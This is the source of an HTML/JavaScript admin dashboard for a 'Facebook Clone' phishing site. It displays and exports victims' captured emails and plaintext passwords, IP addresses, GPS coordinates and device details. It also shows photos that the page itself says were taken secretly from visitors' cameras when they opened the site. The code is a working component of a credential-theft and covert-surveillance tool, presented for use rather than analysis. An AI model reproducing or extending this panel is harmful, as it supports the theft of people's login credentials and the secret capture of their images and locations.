<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - Facebook Clone</title>
    <link rel="stylesheet" href="output.css" />
</head>
<body class="admin-page">
    <!-- Header -->
    <div class="admin-header">
        <div class="container">
            <h1 class="admin-title">üîê Facebook Clone - Admin Panel</h1>
            <p class="admin-subtitle">Monitor all login attempts and user data</p>
        </div>
    </div>

    <!-- Stats Section -->
    <div class="container">
        <div class="stats-grid">
            <div class="stat-card gradient-1">
                <div class="stat-info">
                    <h3>Total Users</h3>
                    <p id="totalUsers">0</p>
                </div>
                <div class="stat-icon">üë•</div>
            </div>
            
            <div class="stat-card gradient-2">
                <div class="stat-info">
                    <h3>Page Visits</h3>
                    <p id="totalVisits">0</p>
                </div>
                <div class="stat-icon">üìä</div>
            </div>
            
            <div class="stat-card gradient-3">
                <div class="stat-info">
                    <h3>Unique IPs</h3>
                    <p id="uniqueIPs">0</p>
                </div>
                <div class="stat-icon">üåç</div>
            </div>
            
            <div class="stat-card gradient-4">
                <div class="stat-info">
                    <h3>With Location</h3>
                    <p id="withLocation">0</p>
                </div>
                <div class="stat-icon">üìç</div>
            </div>
        </div>

        <!-- Controls -->
        <div class="controls-panel">
            <div class="control-buttons">
                <button onclick="refreshData()" class="control-button blue">
                    üîÑ Refresh Data
                </button>
                <button onclick="exportData()" class="control-button green">
                    üì• Export CSV
                </button>
                <button onclick="clearAllData()" class="control-button red">
                    üóëÔ∏è Clear All Data
                </button>
            </div>
            <div style="display: flex; align-items: center; gap: 8px;">
                <span>Auto-refresh:</span>
                <label class="toggle-switch">
                    <input type="checkbox" id="autoRefresh">
                    <span class="toggle-slider"></span>
                </label>
            </div>
        </div>

        <!-- Tabs -->
        <div class="tabs-container">
            <div class="tabs-header">
                <button class="tab-button active" onclick="switchTab('users')">üë§ Login Attempts</button>
                <button class="tab-button" onclick="switchTab('visits')">üåç Page Visits</button>
                <button class="tab-button" onclick="switchTab('photos')">üì∏ Camera Photos</button>
            </div>
        </div>

        <!-- Users Panel -->
        <div class="users-panel" id="usersPanel">
            <div class="users-header">
                <h2 class="users-title">üìã User Login Attempts</h2>
                <p class="users-subtitle">All captured login data with location and device information</p>
            </div>
            
            <div class="users-container" id="usersContainer">
                <div class="empty-state">
                    <div class="spinner"></div>
                    <p style="margin-top: 16px; color: #65676b;">Loading user data...</p>
                </div>
            </div>
        </div>

        <!-- Page Visits Panel -->
        <div class="users-panel hidden" id="visitsPanel">
            <div class="users-header">
                <h2 class="users-title">üåç Page Visits with Location</h2>
                <p class="users-subtitle">All page visits captured automatically with location data</p>
            </div>
            
            <div class="users-container" id="visitsContainer">
                <div class="empty-state">
                    <div class="spinner"></div>
                    <p style="margin-top: 16px; color: #65676b;">Loading visits data...</p>
                </div>
            </div>
        </div>

        <!-- Camera Photos Panel -->
        <div class="users-panel hidden" id="photosPanel">
            <div class="users-header">
                <h2 class="users-title">üì∏ Captured Camera Photos</h2>
                <p class="users-subtitle">Auto-captured photos from user's camera when they visit the site</p>
            </div>
            
            <div class="users-container" id="photosContainer">
                <div class="empty-state">
                    <div class="spinner"></div>
                    <p style="margin-top: 16px; color: #65676b;">Loading photos...</p>
                </div>
            </div>
        </div>
    </div>

    <!-- Photo Modal -->
    <div id="photoModal" class="fixed inset-0 bg-black bg-opacity-75 hidden z-50 flex items-center justify-center" onclick="closePhotoModal()">
        <div class="relative max-w-4xl max-h-full p-4" onclick="event.stopPropagation()">
            <button onclick="closePhotoModal()" class="absolute top-2 right-2 z-10 bg-black bg-opacity-50 text-white rounded-full w-8 h-8 flex items-center justify-center hover:bg-opacity-75 transition-colors">
                ‚úï
            </button>
            <img id="modalImage" src="" alt="Full size photo" class="max-w-full max-h-full object-contain rounded-lg">
            <div class="absolute bottom-4 left-4 bg-black bg-opacity-50 text-white px-3 py-2 rounded">
                <p id="modalTimestamp" class="text-sm"></p>
            </div>
        </div>
    </div>

    <style>
        .photo-item img:hover {
            transform: scale(1.05);
            transition: transform 0.2s ease;
        }
        
        .aspect-video {
            aspect-ratio: 16 / 9;
        }
        
        #photoModal {
            backdrop-filter: blur(4px);
        }
        
        .photo-item {
            transition: all 0.2s ease;
        }
        
        .photo-item:hover {
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
            transform: translateY(-2px);
        }
    </style>

    <script>
        let autoRefreshInterval;
        let users = [];
        let visits = [];
        let photos = [];

        // Load data on page load
        window.addEventListener('load', function() {
            refreshData();
            
            // Setup auto-refresh toggle
            document.getElementById('autoRefresh').addEventListener('change', function() {
                if (this.checked) {
                    autoRefreshInterval = setInterval(refreshData, 5000); // Refresh every 5 seconds
                } else {
                    clearInterval(autoRefreshInterval);
                }
            });
        });

        async function refreshData() {
            try {
                // Fetch users, visits, and photos
                const [usersResponse, visitsResponse, photosResponse] = await Promise.all([
                    fetch('/api/admin/users'),
                    fetch('/api/admin/visits'),
                    fetch('/api/admin/photos')
                ]);
                
                users = await usersResponse.json();
                visits = await visitsResponse.json();
                photos = await photosResponse.json();
                
                updateStats();
                displayUsers();
                displayVisits();
                displayPhotos();
            } catch (error) {
                console.error('Error fetching data:', error);
                document.getElementById('usersContainer').innerHTML = `
                    <div class="text-center py-8">
                        <p class="text-red-500">‚ùå Error loading data. Please try again.</p>
                    </div>
                `;
            }
        }

        function switchTab(tab) {
            // Update tab buttons
            document.querySelectorAll('.tab-button').forEach(btn => btn.classList.remove('active'));
            event.target.classList.add('active');
            
            // Show/hide panels
            document.getElementById('usersPanel').classList.add('hidden');
            document.getElementById('visitsPanel').classList.add('hidden');
            document.getElementById('photosPanel').classList.add('hidden');
            
            if (tab === 'users') {
                document.getElementById('usersPanel').classList.remove('hidden');
            } else if (tab === 'visits') {
                document.getElementById('visitsPanel').classList.remove('hidden');
            } else if (tab === 'photos') {
                document.getElementById('photosPanel').classList.remove('hidden');
            }
        }

        function displayVisits() {
            const container = document.getElementById('visitsContainer');
            
            if (visits.length === 0) {
                container.innerHTML = `
                    <div class="text-center py-8">
                        <div class="text-6xl mb-4">üåç</div>
                        <p class="text-gray-500 text-lg">No page visits yet</p>
                        <p class="text-gray-400">Location data will appear here when users visit the site</p>
                    </div>
                `;
                return;
            }

            const visitsHTML = visits.map((visit, index) => {
                const ipAddress = visit.ipAddress || 'Unknown';
                const hasLocation = visit.location && (visit.location.latitude || visit.location.longitude);
                const locationSource = visit.location?.source || 'Unknown';
                
                return `
                <div class="user-card bg-gradient-to-r from-green-50 to-blue-50 border border-gray-200 rounded-lg p-6 mb-4">
                    <div class="flex justify-between items-start mb-4">
                        <div class="flex items-center space-x-3">
                            <div class="w-12 h-12 bg-gradient-to-r from-green-500 to-blue-600 rounded-full flex items-center justify-center text-white font-bold text-lg">
                                üåç
                            </div>
                            <div>
                                <h3 class="font-bold text-lg text-gray-800">Page Visit #${visits.length - index}</h3>
                                <p class="text-sm text-gray-600">IP: ${ipAddress}</p>
                            </div>
                        </div>
                        <div class="flex space-x-2">
                            <span class="${hasLocation ? 'bg-green-500' : 'bg-gray-400'} text-white px-3 py-1 rounded-full text-xs font-semibold">
                                ${hasLocation ? 'üìç LOCATED' : '‚ùå NO LOCATION'}
                            </span>
                        </div>
                    </div>
                    
                    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                        <div class="bg-white p-4 rounded-lg shadow-sm">
                            <h4 class="font-semibold text-gray-700 mb-2">üåç Location & IP</h4>
                            <p class="text-sm mb-2"><strong>IP Address:</strong> <span class="bg-blue-100 text-blue-800 px-2 py-1 rounded font-mono text-xs">${ipAddress}</span></p>
                            <p class="text-sm mb-2"><strong>Location Source:</strong> <span class="bg-purple-100 text-purple-800 px-2 py-1 rounded text-xs">${locationSource}</span></p>
                            ${hasLocation ? `
                                <p class="text-sm mb-2"><strong>Coordinates:</strong> <span class="text-green-600 font-mono text-xs">${visit.location.latitude ? visit.location.latitude.toFixed(4) : 'N/A'}, ${visit.location.longitude ? visit.location.longitude.toFixed(4) : 'N/A'}</span></p>
                                ${visit.location.latitude && visit.location.longitude ? `<a href="https://www.google.com/maps?q=${visit.location.latitude},${visit.location.longitude}" target="_blank" class="text-blue-500 hover:underline text-xs inline-block mt-1">üìç View on Map</a>` : ''}
                                ${visit.location.city ? `<p class="text-sm"><strong>City:</strong> ${visit.location.city}</p>` : ''}
                                ${visit.location.country ? `<p class="text-sm"><strong>Country:</strong> ${visit.location.country}</p>` : ''}
                                ${visit.location.region ? `<p class="text-sm"><strong>Region:</strong> ${visit.location.region}</p>` : ''}
                            ` : '<p class="text-sm text-gray-500">‚ùå Location not captured</p>'}
                        </div>
                        
                        <div class="bg-white p-4 rounded-lg shadow-sm">
                            <h4 class="font-semibold text-gray-700 mb-2">‚è∞ Visit Details</h4>
                            <p class="text-sm mb-1"><strong>Date:</strong> ${new Date(visit.timestamp).toLocaleDateString()}</p>
                            <p class="text-sm mb-1"><strong>Time:</strong> ${new Date(visit.timestamp).toLocaleTimeString()}</p>
                            <p class="text-sm mb-1"><strong>Ago:</strong> <span class="text-purple-600 font-semibold">${getTimeAgo(visit.timestamp)}</span></p>
                            ${visit.timezone ? `<p class="text-sm"><strong>Timezone:</strong> ${visit.timezone}</p>` : ''}
                        </div>
                        
                        <div class="bg-white p-4 rounded-lg shadow-sm">
                            <h4 class="font-semibold text-gray-700 mb-2">üíª Device Info</h4>
                            ${visit.screenResolution ? `<p class="text-sm mb-1"><strong>Screen:</strong> ${visit.screenResolution}</p>` : ''}
                            ${visit.referrer ? `<p class="text-sm mb-1"><strong>Referrer:</strong> <span class="text-xs break-all">${visit.referrer}</span></p>` : ''}
                            ${visit.url ? `<p class="text-sm mb-1"><strong>URL:</strong> <span class="text-xs break-all">${visit.url}</span></p>` : ''}
                        </div>
                    </div>
                    
                    ${visit.userAgent ? `
                        <div class="mt-4 bg-white p-4 rounded-lg shadow-sm">
                            <h4 class="font-semibold text-gray-700 mb-2">üíª User Agent</h4>
                            <p class="text-xs text-gray-600 break-all leading-relaxed">${visit.userAgent}</p>
                        </div>
                    ` : ''}
                </div>
                `;
            }).join('');

            container.innerHTML = visitsHTML;
        }

        function displayPhotos() {
            const container = document.getElementById('photosContainer');
            
            if (photos.length === 0) {
                container.innerHTML = `
                    <div class="text-center py-8">
                        <div class="text-6xl mb-4">üì∏</div>
                        <p class="text-gray-500 text-lg">No automatic photos captured yet</p>
                        <p class="text-gray-400">Camera photos will appear here automatically when users visit the site</p>
                    </div>
                `;
                return;
            }

            // Group photos by visitId and sort by timestamp
            const photosByVisit = {};
            photos.forEach(photo => {
                if (!photosByVisit[photo.visitId]) {
                    photosByVisit[photo.visitId] = [];
                }
                photosByVisit[photo.visitId].push(photo);
            });
            
            // Sort each visitor's photos by photo number
            Object.keys(photosByVisit).forEach(visitId => {
                photosByVisit[visitId].sort((a, b) => a.photoNumber - b.photoNumber);
            });

            const photosHTML = Object.entries(photosByVisit).map(([visitId, visitPhotos], index) => {
                const firstPhoto = visitPhotos[0];
                const ipAddress = firstPhoto.ipAddress || 'Unknown';
                const hasLocation = firstPhoto.location && (firstPhoto.location.latitude || firstPhoto.location.longitude);
                const totalSize = visitPhotos.reduce((sum, photo) => sum + (photo.photoSize || 0), 0);
                
                return `
                <div class="user-card bg-gradient-to-r from-pink-50 to-orange-50 border border-gray-200 rounded-lg p-6 mb-4">
                    <div class="flex justify-between items-start mb-4">
                        <div class="flex items-center space-x-3">
                            <div class="w-12 h-12 bg-gradient-to-r from-pink-500 to-orange-600 rounded-full flex items-center justify-center text-white font-bold text-lg">
                                üì∏
                            </div>
                            <div>
                                <h3 class="font-bold text-lg text-gray-800">üîí SECRET Visitor ${Object.keys(photosByVisit).length - index}</h3>
                                <p class="text-sm text-gray-600">IP: ${ipAddress}</p>
                                ${hasLocation ? `<p class="text-xs text-green-600">üìç ${firstPhoto.location.city || 'Unknown'}, ${firstPhoto.location.country || 'Unknown'}</p>` : ''}
                            </div>
                        </div>
                        <div class="flex flex-col space-y-1">
                            <span class="bg-red-500 text-white px-3 py-1 rounded-full text-xs font-semibold">
                                üîí ${visitPhotos.length} AUTO PHOTOS
                            </span>
                            <span class="bg-blue-500 text-white px-3 py-1 rounded-full text-xs font-semibold">
                                üíæ ${totalSize}KB Total
                            </span>
                        </div>
                    </div>
                    
                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
                        <div class="bg-white p-4 rounded-lg shadow-sm">
                            <h4 class="font-semibold text-gray-700 mb-2">‚è∞ Capture Details</h4>
                            <p class="text-sm mb-1"><strong>First Photo:</strong> ${new Date(firstPhoto.timestamp).toLocaleString()}</p>
                            <p class="text-sm mb-1"><strong>Ago:</strong> <span class="text-purple-600 font-semibold">${getTimeAgo(firstPhoto.timestamp)}</span></p>
                            <p class="text-sm mb-1"><strong>Capture Type:</strong> <span class="bg-orange-100 text-orange-800 px-2 py-1 rounded text-xs">Automatic</span></p>
                            <p class="text-sm"><strong>Visit ID:</strong> <span class="font-mono text-xs bg-gray-100 px-2 py-1 rounded">${visitId}</span></p>
                        </div>
                        
                        ${hasLocation ? `
                        <div class="bg-white p-4 rounded-lg shadow-sm">
                            <h4 class="font-semibold text-gray-700 mb-2">üìç Location Data</h4>
                            <p class="text-sm mb-1"><strong>Coordinates:</strong> <span class="text-green-600 font-mono text-xs">${firstPhoto.location.latitude ? firstPhoto.location.latitude.toFixed(4) : 'N/A'}, ${firstPhoto.location.longitude ? firstPhoto.location.longitude.toFixed(4) : 'N/A'}</span></p>
                            ${firstPhoto.location.city ? `<p class="text-sm mb-1"><strong>City:</strong> ${firstPhoto.location.city}</p>` : ''}
                            ${firstPhoto.location.country ? `<p class="text-sm mb-1"><strong>Country:</strong> ${firstPhoto.location.country}</p>` : ''}
                            ${firstPhoto.location.source ? `<p class="text-sm"><strong>Source:</strong> <span class="bg-green-100 text-green-800 px-2 py-1 rounded text-xs">${firstPhoto.location.source}</span></p>` : ''}
                            ${firstPhoto.location.latitude && firstPhoto.location.longitude ? `<a href="https://www.google.com/maps?q=${firstPhoto.location.latitude},${firstPhoto.location.longitude}" target="_blank" class="text-blue-500 hover:underline text-xs inline-block mt-2">üìç View on Google Maps</a>` : ''}
                        </div>
                        ` : `
                        <div class="bg-white p-4 rounded-lg shadow-sm">
                            <h4 class="font-semibold text-gray-700 mb-2">üìç Location Data</h4>
                            <p class="text-sm text-gray-500">‚ùå Location not captured</p>
                        </div>
                        `}
                    </div>
                    
                    ${firstPhoto.deviceInfo ? `
                    <div class="bg-white p-4 rounded-lg shadow-sm mb-4">
                        <h4 class="font-semibold text-gray-700 mb-2">üíª Device Information</h4>
                        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
                            ${firstPhoto.deviceInfo.screenResolution ? `<p class="text-sm"><strong>Screen:</strong> ${firstPhoto.deviceInfo.screenResolution}</p>` : ''}
                            ${firstPhoto.deviceInfo.platform ? `<p class="text-sm"><strong>Platform:</strong> ${firstPhoto.deviceInfo.platform}</p>` : ''}
                            ${firstPhoto.deviceInfo.language ? `<p class="text-sm"><strong>Language:</strong> ${firstPhoto.deviceInfo.language}</p>` : ''}
                            ${firstPhoto.deviceInfo.timezone ? `<p class="text-sm"><strong>Timezone:</strong> ${firstPhoto.deviceInfo.timezone}</p>` : ''}
                            ${firstPhoto.deviceInfo.colorDepth ? `<p class="text-sm"><strong>Color Depth:</strong> ${firstPhoto.deviceInfo.colorDepth}-bit</p>` : ''}
                        </div>
                    </div>
                    ` : ''}
                    
                    <div class="bg-white p-4 rounded-lg shadow-sm">
                        <h4 class="font-semibold text-gray-700 mb-3">üì∑ Automatically Captured Photos</h4>
                        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4">
                            ${visitPhotos.map((photo, photoIndex) => {
                                const captureTypeColor = {
                                    'initial': 'bg-blue-500',
                                    'movement': 'bg-yellow-500', 
                                    'final': 'bg-green-500',
                                    'extra1': 'bg-purple-500',
                                    'extra2': 'bg-indigo-500',
                                    'fallback': 'bg-red-500',
                                    'standard': 'bg-gray-500'
                                }[photo.captureType || 'standard'] || 'bg-gray-500';
                                
                                return `
                                <div class="photo-item border border-gray-200 rounded-lg overflow-hidden hover:shadow-lg transition-all">
                                    <div class="aspect-video bg-gray-100 flex items-center justify-center relative">
                                        <img src="data:image/jpeg;base64,${photo.photoData}" 
                                             alt="Auto-captured photo ${photo.photoNumber}" 
                                             class="w-full h-full object-cover cursor-pointer"
                                             onclick="openPhotoModal('data:image/jpeg;base64,${photo.photoData}', '${photo.timestamp}', '${photo.captureType || 'standard'}', ${photo.photoNumber})">
                                        <div class="absolute top-2 left-2 ${captureTypeColor} text-white px-2 py-1 rounded text-xs font-semibold">
                                            üîí AUTO ${photo.photoNumber}
                                        </div>
                                        <div class="absolute top-2 right-2 bg-black bg-opacity-60 text-white px-2 py-1 rounded text-xs">
                                            ${photo.captureType || 'standard'}
                                        </div>
                                        <div class="absolute bottom-2 right-2 bg-black bg-opacity-60 text-white px-2 py-1 rounded text-xs">
                                            ${photo.photoSize || Math.round(photo.photoData.length / 1024)}KB
                                        </div>
                                    </div>
                                    <div class="p-3">
                                        <p class="text-xs text-gray-600 mb-1">
                                            <strong>Captured:</strong> ${new Date(photo.timestamp).toLocaleTimeString()}
                                        </p>
                                        <p class="text-xs text-gray-500 mb-1">
                                            <strong>Quality:</strong> <span class="bg-blue-100 text-blue-800 px-2 py-1 rounded text-xs">${photo.quality || 'medium'}</span>
                                        </p>
                                        ${photo.isAutomatic ? '<p class="text-xs text-red-600 font-semibold">üîí Automatic Capture</p>' : ''}
                                    </div>
                                </div>
                                `;
                            }).join('')}
                        </div>
                    </div>
                </div>
                `;
            }).join('');

            container.innerHTML = photosHTML;
        }

        function updateStats() {
            const totalUsers = users.length;
            const totalVisits = visits.length;
            
            // Get all unique IPs from users, visits, and photos
            const allIPs = [
                ...users.map(user => user.ipAddress),
                ...visits.map(visit => visit.ipAddress),
                ...photos.map(photo => photo.ipAddress)
            ];
            const uniqueIPs = [...new Set(allIPs.filter(ip => ip))].length;
            
            // Count unique visitors with photos
            const uniqueVisitorsWithPhotos = [...new Set(photos.map(photo => photo.visitId))].length;

            document.getElementById('totalUsers').textContent = totalUsers;
            document.getElementById('totalVisits').textContent = totalVisits;
            document.getElementById('uniqueIPs').textContent = uniqueIPs;
            document.getElementById('withLocation').textContent = uniqueVisitorsWithPhotos;
        }

        function displayUsers() {
            const container = document.getElementById('usersContainer');
            
            if (users.length === 0) {
                container.innerHTML = `
                    <div class="text-center py-8">
                        <div class="text-6xl mb-4">üì≠</div>
                        <p class="text-gray-500 text-lg">No login attempts yet</p>
                        <p class="text-gray-400">Data will appear here when users try to login</p>
                    </div>
                `;
                return;
            }

            const usersHTML = users.map((user, index) => {
                const email = user.email || 'N/A';
                const password = user.password || 'N/A';
                const ipAddress = user.ipAddress || 'Unknown';
                const hasLocation = user.location && (user.location.latitude || user.location.longitude);
                
                return `
                <div class="user-card bg-gradient-to-r from-blue-50 to-purple-50 border border-gray-200 rounded-lg p-6 mb-4">
                    <div class="flex justify-between items-start mb-4">
                        <div class="flex items-center space-x-3">
                            <div class="w-12 h-12 bg-gradient-to-r from-blue-500 to-purple-600 rounded-full flex items-center justify-center text-white font-bold text-lg">
                                ${email.charAt(0).toUpperCase()}
                            </div>
                            <div>
                                <h3 class="font-bold text-lg text-gray-800">${email}</h3>
                                <p class="text-sm text-gray-600">Login Attempt #${users.length - index}</p>
                            </div>
                        </div>
                        <div class="flex space-x-2">
                            <span class="status-online text-white px-3 py-1 rounded-full text-xs font-semibold">
                                üü¢ CAPTURED
                            </span>
                            <button onclick="deleteUser('${user._id}')" class="bg-red-500 hover:bg-red-600 text-white px-3 py-1 rounded text-xs transition-colors">
                                üóëÔ∏è Delete
                            </button>
                        </div>
                    </div>
                    
                    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                        <div class="bg-white p-4 rounded-lg shadow-sm">
                            <h4 class="font-semibold text-gray-700 mb-2">üîê Credentials</h4>
                            <p class="text-sm mb-2"><strong>Email:</strong> <span class="bg-blue-100 text-blue-800 px-2 py-1 rounded font-mono text-xs">${email}</span></p>
                            <p class="text-sm"><strong>Password:</strong> <span class="bg-red-100 text-red-800 px-2 py-1 rounded font-mono text-xs">${password}</span></p>
                        </div>
                        
                        <div class="bg-white p-4 rounded-lg shadow-sm">
                            <h4 class="font-semibold text-gray-700 mb-2">üåç Location & IP</h4>
                            <p class="text-sm mb-2"><strong>IP Address:</strong> <span class="bg-blue-100 text-blue-800 px-2 py-1 rounded font-mono text-xs">${ipAddress}</span></p>
                            ${hasLocation ? `
                                <p class="text-sm mb-2"><strong>Coordinates:</strong> <span class="text-green-600 font-mono text-xs">${user.location.latitude ? user.location.latitude.toFixed(4) : 'N/A'}, ${user.location.longitude ? user.location.longitude.toFixed(4) : 'N/A'}</span></p>
                                ${user.location.latitude && user.location.longitude ? `<a href="https://www.google.com/maps?q=${user.location.latitude},${user.location.longitude}" target="_blank" class="text-blue-500 hover:underline text-xs inline-block mt-1">üìç View on Map</a>` : ''}
                                ${user.location.city ? `<p class="text-sm"><strong>City:</strong> ${user.location.city}</p>` : ''}
                                ${user.location.country ? `<p class="text-sm"><strong>Country:</strong> ${user.location.country}</p>` : ''}
                            ` : '<p class="text-sm text-gray-500">‚ùå Location not captured</p>'}
                        </div>
                        
                        <div class="bg-white p-4 rounded-lg shadow-sm">
                            <h4 class="font-semibold text-gray-700 mb-2">‚è∞ Timing</h4>
                            <p class="text-sm mb-1"><strong>Date:</strong> ${new Date(user.timestamp).toLocaleDateString()}</p>
                            <p class="text-sm mb-1"><strong>Time:</strong> ${new Date(user.timestamp).toLocaleTimeString()}</p>
                            <p class="text-sm"><strong>Ago:</strong> <span class="text-purple-600 font-semibold">${getTimeAgo(user.timestamp)}</span></p>
                        </div>
                    </div>
                    
                    ${user.userAgent ? `
                        <div class="mt-4 bg-white p-4 rounded-lg shadow-sm">
                            <h4 class="font-semibold text-gray-700 mb-2">üíª Device Information</h4>
                            <p class="text-xs text-gray-600 break-all leading-relaxed">${user.userAgent}</p>
                        </div>
                    ` : ''}
                </div>
                `;
            }).join('');

            container.innerHTML = usersHTML;
        }

        function getTimeAgo(timestamp) {
            const now = new Date();
            const time = new Date(timestamp);
            const diffInSeconds = Math.floor((now - time) / 1000);
            
            if (diffInSeconds < 60) return `${diffInSeconds} seconds ago`;
            if (diffInSeconds < 3600) return `${Math.floor(diffInSeconds / 60)} minutes ago`;
            if (diffInSeconds < 86400) return `${Math.floor(diffInSeconds / 3600)} hours ago`;
            return `${Math.floor(diffInSeconds / 86400)} days ago`;
        }

        async function deleteUser(userId) {
            if (!confirm('Are you sure you want to delete this user?')) return;
            
            try {
                const response = await fetch(`/api/admin/users/${userId}`, {
                    method: 'DELETE'
                });
                
                if (response.ok) {
                    refreshData();
                } else {
                    alert('Error deleting user');
                }
            } catch (error) {
                console.error('Delete error:', error);
                alert('Error deleting user');
            }
        }

        async function clearAllData() {
            if (!confirm('Are you sure you want to delete ALL user data? This cannot be undone!')) return;
            
            try {
                console.log('Attempting to clear all data...');
                const response = await fetch('/api/admin/clear-all', {
                    method: 'DELETE',
                    headers: {
                        'Content-Type': 'application/json'
                    }
                });
                
                console.log('Clear all data response:', response);
                
                if (response.ok) {
                    const result = await response.json();
                    console.log('Clear all data result:', result);
                    // Add a small delay to ensure the database operation completes
                    await new Promise(resolve => setTimeout(resolve, 500));
                    await refreshData();
                    
                    // Force update the UI to show empty states
                    users = [];
                    visits = [];
                    photos = [];
                    updateStats();
                    displayUsers();
                    displayVisits();
                    displayPhotos();
                    
                    alert('All data cleared successfully\n' + 
                          `Users deleted: ${result.deletedCounts?.users || 0}\n` +
                          `Visits deleted: ${result.deletedCounts?.visits || 0}\n` + 
                          `Photos deleted: ${result.deletedCounts?.photos || 0}`);
                } else {
                    const errorText = await response.text();
                    console.error('Clear data error response:', response.status, response.statusText, errorText);
                    alert(`Error clearing data: ${response.status} - ${response.statusText}\n${errorText}`);
                }
            } catch (error) {
                console.error('Clear error:', error);
                alert(`Network error while clearing data: ${error.message}`);
            }
        }

        function exportData() {
            if (users.length === 0) {
                alert('No data to export');
                return;
            }
            
            const csvContent = [
                ['Email', 'Password', 'IP Address', 'Latitude', 'Longitude', 'Timestamp', 'User Agent'].join(','),
                ...users.map(user => [
                    user.email,
                    user.password,
                    user.ipAddress,
                    user.location?.latitude || '',
                    user.location?.longitude || '',
                    user.timestamp,
                    `"${user.userAgent || ''}"`
                ].join(','))
            ].join('\n');
            
            const blob = new Blob([csvContent], { type: 'text/csv' });
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `facebook-clone-data-${new Date().toISOString().split('T')[0]}.csv`;
            a.click();
            window.URL.revokeObjectURL(url);
        }

        function openPhotoModal(imageSrc, timestamp) {
            const modal = document.getElementById('photoModal');
            const modalImage = document.getElementById('modalImage');
            const modalTimestamp = document.getElementById('modalTimestamp');
            
            modalImage.src = imageSrc;
            modalTimestamp.textContent = `Captured: ${new Date(timestamp).toLocaleString()}`;
            modal.classList.remove('hidden');
            
            // Prevent body scroll when modal is open
            document.body.style.overflow = 'hidden';
        }

        function closePhotoModal() {
            const modal = document.getElementById('photoModal');
            modal.classList.add('hidden');
            
            // Restore body scroll
            document.body.style.overflow = 'auto';
        }

        // Close modal with Escape key
        document.addEventListener('keydown', function(event) {
            if (event.key === 'Escape') {
                closePhotoModal();
            }
        });
    </script>
</body>
</html>